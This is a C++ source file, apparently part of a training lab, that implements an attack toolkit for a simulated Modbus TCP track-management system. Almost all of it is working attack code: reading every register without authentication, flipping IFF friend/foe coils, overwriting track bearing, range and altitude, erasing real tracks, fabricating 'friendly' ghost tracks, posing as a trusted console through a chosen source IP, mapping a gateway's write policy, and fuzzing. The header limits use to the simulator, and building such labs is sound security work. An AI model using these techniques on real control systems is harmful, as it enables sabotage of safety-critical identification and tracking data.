// modbus_toolkit.cpp
//
// Attack toolkit for the track-management Modbus TCP simulator
// (see simulator/track_sim.cpp and docs/register-map.md).
//
// Intended for use ONLY against the bundled simulator or other systems you
// are explicitly authorized to test. It demonstrates attack classes that are
// well-documented against real, unauthenticated Modbus TCP deployments:
// enumeration, unauthenticated write / false-data-injection, replay, and
// function-code fuzzing.
//
// Build: see CMakeLists.txt

#include <modbus/modbus.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>
#include <chrono>
#include <thread>
#include <algorithm>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

namespace {

void usage(const char *prog) {
    fprintf(stderr,
        "Usage: %s [--bind-ip <ip>] <host> <port> <mode> [args...]\n\n"
        "  --bind-ip <ip>   Connect from a specific local source IP (e.g. to\n"
        "                    present as the trusted console at 127.0.0.2 against\n"
        "                    a Level 2 access-control gateway)\n\n"
        "Modes:\n"
        "  enumerate                     Dump all coils / holding regs / input regs\n"
        "  spoof-iff <track 0-3> <0|1>   Flip IFF friend/foe coil for a track\n"
        "  spoof-track <track 0-3> <bearing> <range_x10> <alt_x10> <speed>\n"
        "                                 Overwrite a track's kinematic data\n"
        "  kill-track <track 0-3>        Clear TRACK_ACTIVE coil (erase a real track)\n"
        "  ghost-track <track 0-3>       Set TRACK_ACTIVE + IFF friend with no sensor basis\n"
        "  fuzz <iterations>              Send malformed/edge-case function code requests\n"
        "  probe-acl                      Map out an access-control gateway's write\n"
        "                                 policy by testing a range of addresses\n"
        "  (replay mode: planned, see README roadmap — not yet implemented)\n"
        "\nExample:\n"
        "  %s 127.0.0.1 15020 enumerate\n"
        "  %s 127.0.0.1 15021 probe-acl\n"
        "  %s --bind-ip 127.0.0.2 127.0.0.1 15021 spoof-iff 1 1\n",
        prog, prog, prog, prog);
}

modbus_t *connect_target(const char *host, int port, const char *bind_ip) {
    modbus_t *ctx = modbus_new_tcp(host, port);
    if (!ctx) {
        fprintf(stderr, "[-] Failed to create context\n");
        return nullptr;
    }

    if (bind_ip) {
        // Manually create, bind, and connect the socket so the connection
        // originates from a chosen local IP, then hand it to libmodbus.
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            fprintf(stderr, "[-] socket() failed\n");
            modbus_free(ctx);
            return nullptr;
        }
        struct sockaddr_in local{};
        local.sin_family = AF_INET;
        local.sin_port = 0; // any local port
        inet_pton(AF_INET, bind_ip, &local.sin_addr);
        if (bind(sock, (struct sockaddr *)&local, sizeof(local)) < 0) {
            fprintf(stderr, "[-] bind() to %s failed: %s\n", bind_ip, strerror(errno));
            close(sock);
            modbus_free(ctx);
            return nullptr;
        }
        struct sockaddr_in remote{};
        remote.sin_family = AF_INET;
        remote.sin_port = htons(port);
        inet_pton(AF_INET, host, &remote.sin_addr);
        if (connect(sock, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
            fprintf(stderr, "[-] connect() from %s failed: %s\n", bind_ip, strerror(errno));
            close(sock);
            modbus_free(ctx);
            return nullptr;
        }
        modbus_set_socket(ctx, sock);
        printf("[*] Connected to %s:%d from source IP %s\n", host, port, bind_ip);
    } else {
        if (modbus_connect(ctx) == -1) {
            fprintf(stderr, "[-] Connection failed: %s\n", modbus_strerror(errno));
            modbus_free(ctx);
            return nullptr;
        }
    }
    return ctx;
}

int mode_enumerate(modbus_t *ctx) {
    uint8_t coils[32] = {0};
    uint16_t hregs[128] = {0};
    uint16_t iregs[16] = {0};

    printf("[*] Reading coils 0-31...\n");
    if (modbus_read_bits(ctx, 0, 32, coils) == -1) {
        fprintf(stderr, "[-] read_bits failed: %s\n", modbus_strerror(errno));
    } else {
        for (int i = 0; i < 32; i++) if (coils[i]) printf("    coil[%2d] = 1\n", i);
    }

    printf("[*] Reading holding registers 0-127 (chunked at Modbus's 125-register read limit)...\n");
    bool hreg_ok = true;
    for (int start = 0; start < 128; start += 100) {
        int qty = std::min(100, 128 - start);
        if (modbus_read_registers(ctx, start, qty, hregs + start) == -1) {
            fprintf(stderr, "[-] read_registers(%d,%d) failed: %s\n", start, qty, modbus_strerror(errno));
            hreg_ok = false;
        }
    }
    if (hreg_ok) {
        for (int i = 0; i < 128; i++) if (hregs[i]) printf("    hreg[%3d] = %u\n", i, hregs[i]);
    }

    printf("[*] Reading input registers 0-15...\n");
    if (modbus_read_input_registers(ctx, 0, 16, iregs) == -1) {
        fprintf(stderr, "[-] read_input_registers failed: %s\n", modbus_strerror(errno));
    } else {
        for (int i = 0; i < 16; i++) if (iregs[i]) printf("    ireg[%2d] = %u\n", i, iregs[i]);
    }

    printf("[*] No authentication was required to read this state. See docs/register-map.md.\n");
    return 0;
}

int mode_spoof_iff(modbus_t *ctx, int track, int friend_bit) {
    int coil_addr = 8 + track;
    printf("[*] Writing coil[%d] (IFF_TRACK%d_FRIEND) = %d\n", coil_addr, track + 1, friend_bit);
    if (modbus_write_bit(ctx, coil_addr, friend_bit) == -1) {
        fprintf(stderr, "[-] write_bit failed: %s\n", modbus_strerror(errno));
        return 1;
    }
    printf("[+] Track %d IFF status spoofed to %s with no authentication.\n",
           track + 1, friend_bit ? "FRIEND" : "UNKNOWN/HOSTILE");
    return 0;
}

int mode_spoof_track(modbus_t *ctx, int track, int bearing, int range10, int alt10, int speed) {
    int base = track * 4;
    uint16_t vals[4] = {
        static_cast<uint16_t>(bearing),
        static_cast<uint16_t>(range10),
        static_cast<uint16_t>(alt10),
        static_cast<uint16_t>(speed)
    };
    printf("[*] Writing kinematic block for track %d (regs %d-%d): bearing=%d range=%.1fnm alt=%dft speed=%dkt\n",
           track + 1, base, base + 3, bearing, range10 / 10.0, alt10 * 10, speed);
    if (modbus_write_registers(ctx, base, 4, vals) == -1) {
        fprintf(stderr, "[-] write_registers failed: %s\n", modbus_strerror(errno));
        return 1;
    }
    printf("[+] False kinematic data injected — no bounds checking or auth on the write.\n");
    return 0;
}

int mode_kill_track(modbus_t *ctx, int track) {
    printf("[*] Clearing coil[%d] (TRACK%d_ACTIVE)\n", track, track + 1);
    if (modbus_write_bit(ctx, track, 0) == -1) {
        fprintf(stderr, "[-] write_bit failed: %s\n", modbus_strerror(errno));
        return 1;
    }
    printf("[+] Track %d marked inactive — a real track can be erased from the display this way.\n", track + 1);
    return 0;
}

int mode_ghost_track(modbus_t *ctx, int track) {
    printf("[*] Fabricating track %d with no sensor basis: active + friendly\n", track + 1);
    if (modbus_write_bit(ctx, track, 1) == -1 ||
        modbus_write_bit(ctx, 8 + track, 1) == -1) {
        fprintf(stderr, "[-] write_bit failed: %s\n", modbus_strerror(errno));
        return 1;
    }
    uint16_t vals[4] = {90, 50, 200, 150};
    modbus_write_registers(ctx, track * 4, 4, vals);
    printf("[+] Ghost track injected — a nonexistent contact now shows as active+friendly.\n");
    return 0;
}

const char *classify_write_result(int rc) {
    if (rc != -1) return "ALLOWED";
    if (errno == EMBXILFUN) return "DENIED (illegal function — likely untrusted source IP)";
    if (errno == EMBXILADD) return "DENIED (illegal data address — out of the writable range)";
    return "DENIED (other error)";
}

int mode_probe_acl(modbus_t *ctx) {
    printf("[*] Probing write access across a spread of coils/registers.\n");
    printf("[*] This does not bypass an access-control gateway — it maps out\n");
    printf("    which addresses/functions this connection is allowed to touch.\n\n");

    struct Probe { const char *label; bool is_coil; int addr; };
    std::vector<Probe> probes = {
        {"coil 0  (TRACK1_ACTIVE)",      true,  0},
        {"coil 9  (IFF_TRACK2_FRIEND)",  true,  9},
        {"coil 16 (OPERATOR_LOCKOUT)",   true,  16},
        {"coil 17 (ALARM_SILENCED)",     true,  17},
        {"reg 0   (TRACK1_BEARING)",     false, 0},
        {"reg 12  (TRACK4_BEARING)",     false, 12},
        {"reg 100 (SYSTEM_MODE)",        false, 100},
        {"reg 101 (WATCHDOG_COUNTER)",   false, 101},
    };

    for (const auto &p : probes) {
        int rc = p.is_coil
            ? modbus_write_bit(ctx, p.addr, 1)
            : modbus_write_register(ctx, p.addr, 12345);
        printf("  %-30s -> %s\n", p.label, classify_write_result(rc));
    }

    printf("\n[*] Reads remain open under this policy regardless of the above:\n");
    uint16_t one_reg;
    printf("    read holding_reg[0] -> %s\n",
           modbus_read_registers(ctx, 0, 1, &one_reg) != -1 ? "ALLOWED" : "DENIED");
    return 0;
}

int mode_fuzz(modbus_t *ctx, int iterations) {
    printf("[*] Sending %d malformed/edge-case function-code requests...\n", iterations);
    int errors = 0, unexpected_ok = 0;

    for (int i = 0; i < iterations; i++) {
        int addr = rand() % 300 - 100;       // includes out-of-range and negative
        int qty  = (rand() % 300) - 50;      // includes zero, negative, oversized

        int rc;
        int op = i % 4;
        switch (op) {
            case 0: rc = modbus_read_bits(ctx, addr, qty, nullptr); break;
            case 1: rc = modbus_read_registers(ctx, addr, qty, nullptr); break;
            case 2: {
                uint16_t v = static_cast<uint16_t>(rand());
                rc = modbus_write_register(ctx, addr, v);
                break;
            }
            default: rc = modbus_write_bit(ctx, addr, rand() % 2); break;
        }

        if (rc == -1) {
            errors++; // expected: server correctly rejected malformed request
        } else {
            unexpected_ok++;
            printf("    [!] op=%d addr=%d qty/val=%d succeeded unexpectedly\n", op, addr, qty);
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }

    printf("[*] Fuzz summary: %d rejected as expected, %d unexpected successes\n", errors, unexpected_ok);
    if (unexpected_ok > 0) {
        printf("[!] Unexpected successes indicate missing bounds validation on the target — investigate.\n");
    }
    return 0;
}

} // namespace

int main(int argc, char **argv) {
    if (argc < 4) {
        usage(argv[0]);
        return 1;
    }

    // Optional leading "--bind-ip <ip>" flag shifts the remaining positional args.
    const char *bind_ip = nullptr;
    int arg_offset = 1;
    if (std::string(argv[1]) == "--bind-ip") {
        if (argc < 6) { usage(argv[0]); return 1; }
        bind_ip = argv[2];
        arg_offset = 3;
    }

    const char *host = argv[arg_offset];
    int port = atoi(argv[arg_offset + 1]);
    std::string mode = argv[arg_offset + 2];
    int a = arg_offset + 3; // index of the first mode-specific argument

    modbus_t *ctx = connect_target(host, port, bind_ip);
    if (!ctx) return 1;

    int rc = 0;

    if (mode == "enumerate") {
        rc = mode_enumerate(ctx);
    } else if (mode == "spoof-iff" && argc >= a + 2) {
        rc = mode_spoof_iff(ctx, atoi(argv[a]), atoi(argv[a + 1]));
    } else if (mode == "spoof-track" && argc >= a + 5) {
        rc = mode_spoof_track(ctx, atoi(argv[a]), atoi(argv[a + 1]), atoi(argv[a + 2]), atoi(argv[a + 3]), atoi(argv[a + 4]));
    } else if (mode == "kill-track" && argc >= a + 1) {
        rc = mode_kill_track(ctx, atoi(argv[a]));
    } else if (mode == "ghost-track" && argc >= a + 1) {
        rc = mode_ghost_track(ctx, atoi(argv[a]));
    } else if (mode == "fuzz") {
        int iters = (argc >= a + 1) ? atoi(argv[a]) : 200;
        rc = mode_fuzz(ctx, iters);
    } else if (mode == "probe-acl") {
        rc = mode_probe_acl(ctx);
    } else {
        usage(argv[0]);
        rc = 1;
    }

    modbus_close(ctx);
    modbus_free(ctx);
    return rc;
}
